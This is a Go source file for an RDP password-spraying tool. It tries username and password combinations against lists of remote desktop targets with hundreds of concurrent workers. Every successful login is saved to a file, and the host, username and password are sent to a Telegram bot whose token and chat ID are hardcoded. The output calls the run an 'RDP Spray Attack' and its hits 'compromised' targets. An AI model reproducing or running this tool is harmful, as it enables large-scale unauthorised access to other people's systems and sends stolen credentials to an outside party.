// main.go - Optimized RDP Spray Tool

package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Configuration flags
var (
	restoreTask             bool
	CONCURRENT_PER_WORKER   int
	pathToUsernameList      string
	usernameListRandomization bool
	pathToPasswordList      string
	passwordListRandomization bool
	protocol                string
	pathToTargetList        string
	workersNumber           int
	enableTelegram          bool = true
	verbose                 bool = false

	// Telegram configuration (load from env or flags for security)
	telegramBotToken string
	telegramChatID   int64
)

// Statistics tracking
var (
	stats struct {
		goods  int64
		errors int64
	}
	startTime      time.Time
	totalTargets   int
	totalAttempts  int
	telegramMsgID  int
)

// Shutdown control
var (
	shutdownChan chan struct{}
	shutdownOnce sync.Once
)

// TelegramConfig holds Telegram API configuration
type TelegramConfig struct {
	BotToken string
	ChatID   int64
}

// GetTelegramConfig loads configuration from flags or environment
func GetTelegramConfig() TelegramConfig {
	// Priority: flags > environment > defaults
	token := telegramBotToken
	if token == "" {
		token = os.Getenv("TELEGRAM_BOT_TOKEN")
	}
	if token == "" {
		token = "7662028089:AAEtFVCcc_ooHK5-_-Zl-3efP3gXGs-LoS8" // Fallback (should use env var)
	}

	chatID := telegramChatID
	if chatID == 0 {
		if envChatID := os.Getenv("TELEGRAM_CHAT_ID"); envChatID != "" {
			if id, err := strconv.ParseInt(envChatID, 10, 64); err == nil {
				chatID = id
			}
		}
	}
	if chatID == 0 {
		chatID = 6423543278 // Fallback
	}

	return TelegramConfig{BotToken: token, ChatID: chatID}
}

// appendToFile appends data to a file with proper error handling
func appendToFile(data, filepath string) {
	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("⚠️  Failed to open file %s: %v\n", filepath, err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		fmt.Printf("⚠️  Failed to write to file %s: %v\n", filepath, err)
	}
}

// sendTelegramMessage sends a message to Telegram with retry logic
func sendTelegramMessage(text string) {
	if !enableTelegram {
		return
	}

	config := GetTelegramConfig()
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", config.BotToken)

	params := url.Values{}
	params.Add("chat_id", strconv.FormatInt(config.ChatID, 10))
	params.Add("text", text)
	params.Add("parse_mode", "Markdown")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(apiURL + "?" + params.Encode())
	if err != nil {
		fmt.Printf("⚠️  Telegram error: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		fmt.Printf("⚠️  Telegram API returned status %d: %s\n", resp.StatusCode, string(body))
	}
}

// printSuccessfulLogin handles successful credential discoveries
func printSuccessfulLogin(ctx context.Context, results chan string, localIP string) {
	for {
		select {
		case <-ctx.Done():
			return
		case credentials, ok := <-results:
			if !ok {
				return
			}

			atomic.AddInt64(&stats.goods, 1)

			// Split into exactly 4 parts: host, port, username, password
			// SplitN ensures password (4th part) can contain colons
			parts := strings.SplitN(credentials, ":", 4)
			if len(parts) < 4 {
				fmt.Printf("⚠️  Malformed credentials: %s\n", credentials)
				continue
			}

			host := parts[0]
			port := parts[1]
			username := parts[2]
			password := parts[3]

			// Detailed format for detailed-results.txt
			detailedInfo := fmt.Sprintf(`
=== 🎯 RDP Success 🎯 ===
🌐 Target: %s:%s
👤 User: %s
🔑 Password: %s
🕒 Timestamp: %s
🖥️  Local IP: %s
========================
`,
				host, port, username, password,
				time.Now().Format("2006-01-02 15:04:05"),
				localIP,
			)
			appendToFile(detailedInfo, "detailed-results.txt")

			// Send Telegram alert
			alertMsg := fmt.Sprintf("🎯 *RDP Success!*\nTarget: `%s:%s`\nUser: `%s`\nPass: `%s`",
				host, port, username, password)
			sendTelegramMessage(alertMsg)

			// Console output
			fmt.Printf("\n✅ SUCCESS: %s:%s@%s:%s\n", host, port, username, password)
		}
	}
}

// formatTime formats seconds into HH:MM:SS
func formatTime(seconds float64) string {
	hours := int(seconds) / 3600
	minutes := (int(seconds) % 3600) / 60
	secs := int(seconds) % 60
	return fmt.Sprintf("%02d:%02d:%02d", hours, minutes, secs)
}

// printStats generates statistics report
func printStats(forTelegram bool) string {
	goods := atomic.LoadInt64(&stats.goods)
	errors := atomic.LoadInt64(&stats.errors)

	totalConnections := int(goods + errors)
	elapsedTime := time.Since(startTime).Seconds()

	connectionsPerSecond := 0.0
	if elapsedTime > 0 {
		connectionsPerSecond = float64(totalConnections) / elapsedTime
	}

	estimatedRemainingTime := 0.0
	if connectionsPerSecond > 0 && totalAttempts > totalConnections {
		estimatedRemainingTime = float64(totalAttempts-totalConnections) / connectionsPerSecond
	}

	activeConns := globalMonitor.GetActiveCount()
	peakConns := atomic.LoadInt64(&globalMonitor.peakConnections)

	if forTelegram {
		var text strings.Builder
		text.WriteString("==============================\n")
		text.WriteString("🎯 RDP Spray Attack\n")
		text.WriteString(fmt.Sprintf("📁 Targets: %d | 👥 Workers: %d\n", totalTargets, workersNumber))
		text.WriteString("==============================\n")
		text.WriteString(fmt.Sprintf("🔍 Checked: %d/%d\n", totalConnections, totalAttempts))
		text.WriteString(fmt.Sprintf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond))
		text.WriteString(fmt.Sprintf("🔗 Active: %d | 📊 Peak: %d\n", activeConns, peakConns))

		if totalConnections < totalAttempts {
			text.WriteString(fmt.Sprintf("⏳ Elapsed: %s\n", formatTime(elapsedTime)))
			text.WriteString(fmt.Sprintf("⏰ Remaining: %s\n", formatTime(estimatedRemainingTime)))
		} else {
			text.WriteString(fmt.Sprintf("⏳ Total Time: %s\n", formatTime(elapsedTime)))
			text.WriteString("✅ Scan Completed!\n")
		}

		text.WriteString("==============================\n")
		text.WriteString(fmt.Sprintf("✅ Success: %d | ❌ Failed: %d\n", goods, errors))

		if totalConnections > 0 {
			successRate := float64(goods) / float64(totalConnections) * 100
			text.WriteString(fmt.Sprintf("📊 Success Rate: %.2f%%\n", successRate))
		}
		text.WriteString("==============================\n")

		return text.String()
	}

	// Console output
	clear()
	fmt.Printf("================================================\n")
	fmt.Printf("🎯 RDP Spray Attack\n")
	fmt.Printf("📁 Targets: %d | 👥 Workers: %d\n", totalTargets, workersNumber)
	fmt.Printf("================================================\n")
	fmt.Printf("🔍 Checked: %d/%d\n", totalConnections, totalAttempts)
	fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)
	fmt.Printf("🔗 Active: %d | 📊 Peak: %d\n", activeConns, peakConns)

	if activeConns > 5000 {
		fmt.Printf("⚠️  WARNING: High connection count!\n")
	}

	if totalConnections < totalAttempts {
		fmt.Printf("⏳ Elapsed: %s\n", formatTime(elapsedTime))
		fmt.Printf("⏰ Remaining: %s\n", formatTime(estimatedRemainingTime))
	} else {
		fmt.Printf("⏳ Total Time: %s\n", formatTime(elapsedTime))
		fmt.Printf("✅ Scan Completed!\n")
	}

	fmt.Printf("================================================\n")
	fmt.Printf("✅ Success: %d | ❌ Failed: %d\n", goods, errors)

	if totalConnections > 0 {
		successRate := float64(goods) / float64(totalConnections) * 100
		fmt.Printf("📊 Success Rate: %.2f%%\n", successRate)
	}
	fmt.Printf("================================================\n")

	if totalConnections >= totalAttempts {
		fmt.Println("🎉 All tasks completed!")
	}

	return ""
}

// sendInitialTelegramMessage sends the first status message and stores message ID
func sendInitialTelegramMessage(text string) {
	if !enableTelegram {
		return
	}

	config := GetTelegramConfig()
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", config.BotToken)

	params := url.Values{}
	params.Add("chat_id", strconv.FormatInt(config.ChatID, 10))
	params.Add("text", text)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(apiURL + "?" + params.Encode())
	if err != nil {
		fmt.Printf("⚠️  Telegram initial message error: %v\n", err)
		return
	}
	defer resp.Body.Close()

	var result struct {
		OK     bool `json:"ok"`
		Result struct {
			MessageID int `json:"message_id"`
		} `json:"result"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		fmt.Printf("⚠️  Telegram decode error: %v\n", err)
		return
	}

	if result.OK && result.Result.MessageID > 0 {
		telegramMsgID = result.Result.MessageID
	}
}

// editTelegramMessage edits an existing Telegram message
func editTelegramMessage(text string) {
	if !enableTelegram || telegramMsgID == 0 {
		return
	}

	config := GetTelegramConfig()
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageText", config.BotToken)

	params := url.Values{}
	params.Add("chat_id", strconv.FormatInt(config.ChatID, 10))
	params.Add("message_id", strconv.Itoa(telegramMsgID))
	params.Add("text", text)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(apiURL + "?" + params.Encode())
	if err != nil {
		fmt.Printf("⚠️  Telegram edit error: %v\n", err)
	}
	defer resp.Body.Close()
}

// statsMonitor runs periodic stats updates
func statsMonitor() {
	consoleTicker := time.NewTicker(500 * time.Millisecond)
	teleTicker := time.NewTicker(30 * time.Second) // Reduced from 60s for more frequent updates
	defer consoleTicker.Stop()
	defer teleTicker.Stop()

	for {
		select {
		case <-consoleTicker.C:
			printStats(false)
		case <-teleTicker.C:
			if enableTelegram && telegramMsgID > 0 {
				editTelegramMessage(printStats(true))
			}
		}
	}
}

// runningTask represents a saved task state
type runningTask struct {
	RandomSeed             int64
	UsersList              string
	PasswordsList          string
	ProtocolToSpray        string
	Targets                []string
	WorkersCount           int
	WorkersStates          []workerState
	UsernamesRandomization bool
	PasswordsRandomization bool
}

var currentTask runningTask

func init() {
	flag.BoolVar(&restoreTask, "restore", false, "Restore task from progress.gob")
	flag.StringVar(&pathToUsernameList, "ul", "usernames.txt", "Path to usernames list")
	flag.StringVar(&pathToPasswordList, "pl", "passwords.txt", "Path to passwords list")
	flag.BoolVar(&usernameListRandomization, "ru", false, "Randomize usernames list")
	flag.BoolVar(&passwordListRandomization, "rp", false, "Randomize passwords list")
	flag.StringVar(&protocol, "p", "rdp", "Protocol (rdp only)")
	flag.StringVar(&pathToTargetList, "tl", "targets.txt", "Path to targets list")
	flag.IntVar(&workersNumber, "w", 500, "Number of workers (reduce if port exhaustion)")
	flag.IntVar(&CONCURRENT_PER_WORKER, "c", 5, "Concurrent connections per worker")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")

	// Telegram configuration flags
	flag.StringVar(&telegramBotToken, "tg-token", "", "Telegram bot token (or set TELEGRAM_BOT_TOKEN)")
	flag.Int64Var(&telegramChatID, "tg-chatid", 0, "Telegram chat ID (or set TELEGRAM_CHAT_ID)")
	flag.BoolVar(&enableTelegram, "tg-enable", true, "Enable Telegram notifications")

	flag.Parse()
}

// handleShutdown sets up signal handling for graceful shutdown
func handleShutdown() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigChan
		fmt.Printf("\n\n⚠️  Received signal %v, initiating graceful shutdown...\n", sig)
		shutdownOnce.Do(func() {
			close(shutdownChan)
		})

		// Wait for second signal for force quit
		sig = <-sigChan
		fmt.Printf("\n⚠️  Received second signal %v, forcing exit...\n", sig)
		os.Exit(1)
	}()
}

func main() {
	// Initialize shutdown channel
	shutdownChan = make(chan struct{})
	handleShutdown()

	// Initialize or restore task
	if restoreTask {
		err := readGob("./progress.gob", &currentTask)
		if err != nil {
			fmt.Printf("❌ Error restoring task: %v\n", err)
			return
		}
		fmt.Println("✅ Task restored from progress.gob")

		// Calculate already processed attempts
		var alreadyProcessed int64
		for i := range currentTask.WorkersStates {
			alreadyProcessed += int64(currentTask.WorkersStates[i].WorkerProgress)
		}
		atomic.StoreInt64(&stats.errors, alreadyProcessed)
		fmt.Printf("📊 Resuming from %d already processed attempts\n", alreadyProcessed)
	} else {
		// Initialize new task
		currentTask.RandomSeed = 0
		if usernameListRandomization || passwordListRandomization {
			currentTask.RandomSeed = time.Now().UnixNano()
			currentTask.UsernamesRandomization = usernameListRandomization
			currentTask.PasswordsRandomization = passwordListRandomization
		}

		currentTask.UsersList = pathToUsernameList
		currentTask.PasswordsList = pathToPasswordList
		currentTask.ProtocolToSpray = "rdp"
		currentTask.Targets = loadList(pathToTargetList)
		currentTask.WorkersCount = workersNumber

		currentTask.WorkersStates = make([]workerState, workersNumber)
		for i := 0; i < workersNumber; i++ {
			currentTask.WorkersStates[i] = workerState{
				WorkerId:       i + 1,
				WorkerProgress: 0,
			}
		}
		saveProgress()
	}

	// Load credentials
	usernames := loadList(currentTask.UsersList)
	passwords := loadList(currentTask.PasswordsList)

	// Validate inputs
	if len(currentTask.Targets) == 0 {
		fmt.Println("❌ No targets loaded. Check targets.txt")
		return
	}
	if len(usernames) == 0 {
		fmt.Println("❌ No usernames loaded. Check usernames.txt")
		return
	}
	if len(passwords) == 0 {
		fmt.Println("❌ No passwords loaded. Check passwords.txt")
		return
	}

	// Apply randomization if enabled
	if currentTask.UsernamesRandomization {
		r := rand.New(rand.NewSource(currentTask.RandomSeed))
		r.Shuffle(len(usernames), func(i, j int) {
			usernames[i], usernames[j] = usernames[j], usernames[i]
		})
	}
	if currentTask.PasswordsRandomization {
		r := rand.New(rand.NewSource(currentTask.RandomSeed))
		r.Shuffle(len(passwords), func(i, j int) {
			passwords[i], passwords[j] = passwords[j], usernames[i]
		})
	}

	// Create job and dispatch to workers
	wholeTask := task{
		targetsRaw:      currentTask.Targets,
		usernames:       usernames,
		passwords:       passwords,
		numberOfWorkers: currentTask.WorkersCount,
	}
	jobs := dispatchTask(wholeTask)

	// Get local IP for reporting
	localIP, err := GetWANIP()
	if err != nil {
		localIP = "127.0.0.1"
	}

	// Setup result channel with buffer for performance
	results := make(chan string, 1000) // Increased buffer

	// Create context for graceful shutdown of result handler
	resultCtx, resultCancel := context.WithCancel(context.Background())
	defer resultCancel()

	// Start result handler
	go printSuccessfulLogin(resultCtx, results, localIP)

	// Load already-compromised targets for skip-on-resume
	successfulTargets := loadSuccessfulTargets()

	// Start workers
	var wg sync.WaitGroup
	for i, job := range jobs {
		wg.Add(1)
		go rdpSpray(&wg, results, job, &currentTask.WorkersStates[i].WorkerProgress, successfulTargets, shutdownChan)
	}

	// Initialize timing and stats
	startTime = time.Now()
	totalTargets = len(currentTask.Targets)

	usernameCount := len(usernames)
	passwordCount := len(passwords)
	if usernameCount > 0 && passwordCount > 0 && totalTargets > 0 {
		totalAttempts = totalTargets * usernameCount * passwordCount
	}

	// Start monitoring goroutines
	go monitorCurrentTask()
	go statsMonitor()

	// Send initial Telegram message
	if enableTelegram {
		sendInitialTelegramMessage(printStats(true))
	}

	// Wait for all workers to complete or shutdown
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		// All workers completed normally
	case <-shutdownChan:
		// Shutdown requested - wait briefly for in-flight operations
		fmt.Println("⏳ Waiting for in-flight operations to complete...")
		select {
		case <-done:
		case <-time.After(10 * time.Second):
			fmt.Println("⚠️  Timeout waiting for workers, proceeding with shutdown...")
		}
	}

	close(results)

	// Final progress save
	saveProgress()

	// Print final stats
	printStats(false)
	if enableTelegram {
		editTelegramMessage(printStats(true))
	}

	fmt.Println("\n✅ Spray operation completed!")
}
